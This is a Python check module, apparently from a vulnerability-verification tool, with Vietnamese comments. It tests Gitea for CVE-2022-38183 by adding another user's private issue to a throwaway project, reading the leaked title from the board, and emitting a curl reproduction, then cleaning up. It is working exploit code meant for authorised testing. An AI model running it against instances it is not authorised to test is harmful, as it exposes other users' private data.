"""CVE-2022-38183 — IDOR trong chức năng "Add existing issue to Project".

Root cause (xem report/Report_VULN-01_CVE-2022-38183.md): endpoint
`POST /{owner}/{repo}/issues/projects` chỉ kiểm tra user có quyền write trên
repo chứa project (repo đích), KHÔNG kiểm tra user có quyền đọc issue được
tham chiếu trong `issue_ids` — kể cả khi issue đó thuộc repo private của
người khác. Gitea < 1.16.9.

Analyze flow (cần auth — attacker phải có 1 account bất kỳ, quyền write trên
1 repo do chính mình tạo):
1. Tạo 1 repo private + 1 project (Basic Kanban) ephemeral thuộc chính account
   attacker — chỉ để có "board của mình" làm nơi quan sát kết quả IDOR.
2. Gửi đúng 1 request PoC: POST /{owner}/{repo}/issues/projects với
   issue_ids=<target_issue_id> (issue thuộc repo private của người khác,
   truyền qua --target-issue-id) + id=<project_id vừa tạo>.
3. GET lại board, tìm xem title của target_issue_id có xuất hiện không (bằng
   chứng issue "bị kéo" vào project dù attacker không có quyền đọc nó).
4. Dọn dẹp: xoá repo ephemeral (kéo theo project) dù kết quả thế nào.

Đây là 1 request PoC duy nhất theo đúng target_issue_id người dùng cung cấp —
KHÔNG brute-force dò range ID.
"""
import re
import uuid

from bs4 import BeautifulSoup

from checks.registry import CheckContext
from core.models import CheckResult, Status

CVE_ID = "CVE-2022-38183"
REF_ID = "VULN-01"
RISK_LEVEL = "Medium"
WSTG_REF = "WSTG-ATHZ-04 — Testing for Bypassing Authorization Schema"
CWE = "CWE-284 — Improper Access Control"
REMEDIATION = (
    "Nâng cấp Gitea lên >= 1.16.9. Nếu tự vá tạm: thêm kiểm tra user hiện tại "
    "có quyền đọc (read) trên repo chứa từng issue trong issue_ids trước khi "
    "gán vào project — áp dụng cùng logic 'issue.RepoID != project.RepoID' đã "
    "có sẵn ở hàm move-issue-on-board, nhưng đưa vào cả bước add-issue ban đầu."
)
REFERENCES = [
    "CVE-2022-38183",
    "GHSA-fhv8-m4j4-cww2",
    "CWE-284: https://cwe.mitre.org/data/definitions/284.html",
]

_PROJECT_BOARD_TITLE_CLASS = "project-board-title"


def _result(status: Status, evidence: str, detail: str, request_repro: str = "", response_summary: str = "") -> CheckResult:
    return CheckResult(
        cve_id=CVE_ID,
        ref_id=REF_ID,
        risk_level=RISK_LEVEL,
        wstg_ref=WSTG_REF,
        cwe=CWE,
        status=status,
        evidence=evidence,
        detail=detail,
        request_repro=request_repro,
        response_summary=response_summary,
        remediation=REMEDIATION,
        references=REFERENCES,
    )


def analyze(ctx: CheckContext) -> CheckResult:
    session = ctx.session
    owner = ctx.args.username
    target_issue_id = ctx.args.target_issue_id
    repo_name = f"nday-check-{uuid.uuid4().hex[:10]}"

    repo_created = False
    try:
        # Bước 1a: tạo ephemeral private repo thuộc chính attacker.
        create_repo_resp = session.api_json(
            "POST",
            "/api/v1/user/repos",
            {"name": repo_name, "private": True, "auto_init": True},
        )
        if create_repo_resp.status_code != 201:
            return _result(
                Status.INCONCLUSIVE,
                evidence=create_repo_resp.text[:500],
                detail=f"Không tạo được ephemeral repo (HTTP {create_repo_resp.status_code}).",
            )
        repo_created = True

        # Bước 1b: tạo project (Basic Kanban) trong repo đó qua web form — bản
        # Gitea trong scope (< 1.16.9) chưa có Project REST API.
        new_project_page = session.get(f"/{owner}/{repo_name}/projects/new")
        new_project_page.raise_for_status()
        csrf = session.extract_csrf_from_html(new_project_page.text)

        project_title = f"nday-check-project-{uuid.uuid4().hex[:6]}"
        create_project_resp = session.post(
            f"/{owner}/{repo_name}/projects/new",
            data={"_csrf": csrf, "title": project_title, "content": "", "board_type": "1"},
        )
        if create_project_resp.status_code not in (200, 302):
            return _result(
                Status.INCONCLUSIVE,
                evidence=create_project_resp.text[:500],
                detail=f"Không tạo được project (HTTP {create_project_resp.status_code}).",
            )

        # Tìm project_id vừa tạo bằng cách khớp title trên trang danh sách project.
        list_resp = session.get(f"/{owner}/{repo_name}/projects")
        list_resp.raise_for_status()
        soup = BeautifulSoup(list_resp.text, "html.parser")
        project_link = None
        for a in soup.find_all("a", href=re.compile(rf"^/{re.escape(owner)}/{re.escape(repo_name)}/projects/\d+$")):
            if project_title in a.get_text():
                project_link = a["href"]
                break
        if project_link is None:
            return _result(
                Status.INCONCLUSIVE,
                evidence=list_resp.text[:500],
                detail="Tạo project có vẻ thành công (redirect OK) nhưng không tìm thấy project_id trên trang danh sách.",
            )
        project_id = project_link.rstrip("/").split("/")[-1]

        # Bước 2: PoC — gán issue_ids=<target_issue_id> vào project của attacker.
        poc_path = f"/{owner}/{repo_name}/issues/projects"
        poc_csrf = session.csrf_token
        poc_resp = session.post(
            poc_path,
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={"_csrf": poc_csrf, "action": "", "issue_ids": str(target_issue_id), "id": project_id},
        )
        request_repro = (
            f"curl -X POST \"{ctx.base_url}{poc_path}\" \\\n"
            "  -H \"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\" \\\n"
            "  -H \"X-Requested-With: XMLHttpRequest\" \\\n"
            "  -H \"Cookie: <session_cookie>\" \\\n"
            f"  --data \"_csrf=<csrf_token>&action=&issue_ids={target_issue_id}&id={project_id}\""
        )
        response_summary = f"HTTP {poc_resp.status_code}: {poc_resp.text[:300]}"

        if poc_resp.status_code != 200 or '"ok":true' not in poc_resp.text.replace(" ", ""):
            return _result(
                Status.NOT_VULNERABLE,
                evidence=response_summary,
                detail=(
                    f"Request gán issue_id={target_issue_id} vào project bị từ chối "
                    "(không trả {\"ok\":true}) — endpoint có vẻ đã kiểm tra quyền đọc issue."
                ),
                request_repro=request_repro,
                response_summary=response_summary,
            )

        # Bước 3: xác nhận issue thực sự xuất hiện trên board (không chỉ tin ok:true).
        board_resp = session.get(f"/{owner}/{repo_name}/projects/{project_id}")
        board_resp.raise_for_status()
        board_soup = BeautifulSoup(board_resp.text, "html.parser")
        leaked_title = None
        for a in board_soup.find_all("a", class_=_PROJECT_BOARD_TITLE_CLASS):
            if a.get("href", "").endswith(f"/issues/{target_issue_id}"):
                leaked_title = a.get_text(strip=True)
                break

        if leaked_title is None:
            return _result(
                Status.INCONCLUSIVE,
                evidence=response_summary,
                detail=(
                    f"Response POST trả {{'ok':true}} nhưng không tìm thấy issue "
                    f"#{target_issue_id} trên board — cần kiểm tra lại target_issue_id "
                    "hoặc cấu trúc HTML board đã đổi."
                ),
                request_repro=request_repro,
                response_summary=response_summary,
            )

        evidence = (
            f"POST {poc_path} -> {{'ok':true}}\n"
            f"Board /{owner}/{repo_name}/projects/{project_id} sau đó hiển thị:\n"
            f'<a class="project-board-title" href="/*/*/issues/{target_issue_id}">{leaked_title}</a>'
        )
        detail = (
            f"Issue #{target_issue_id} (title: '{leaked_title}') đã bị gán thành công vào "
            f"project của attacker dù attacker không có quyền đọc repo chứa issue đó — "
            "xác nhận IDOR: endpoint không kiểm tra quyền đọc issue trước khi gán."
        )
        return _result(Status.VULNERABLE, evidence=evidence, detail=detail, request_repro=request_repro, response_summary=response_summary)

    finally:
        # Dọn dẹp — luôn xoá ephemeral repo (kéo theo project) nếu đã tạo được,
        # bất kể kết quả analyze là gì.
        if repo_created:
            session.api_json("DELETE", f"/api/v1/repos/{owner}/{repo_name}")
